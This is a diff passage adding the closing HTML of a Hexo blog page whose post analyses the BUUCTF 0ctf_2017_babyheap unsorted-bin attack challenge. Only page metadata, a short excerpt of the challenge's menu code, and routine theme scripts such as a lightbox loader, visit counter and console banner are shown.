+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/UnSortedbinAttack%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/",
+          excerpt: "",
+          description: "",
+          stripContent: "UnSortedbin Attack 例题分析参考资料：https://www.cnblogs.com/youdiscovered1t/p/19109746  特别好的一篇文章，很详细！！！ BUUCTF 0ctf_2017_babyheap   123456789int sub_CF4()&amp;#123;  puts(&amp;quot;1. Allocate&amp;quot;);  puts(&amp;quot;2. Fill&amp;quot;);  puts(&amp;quot;3. Free&amp;quot;);  puts(&amp;qu",
+          date: "Tue Apr 28 2026 19:14:15 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
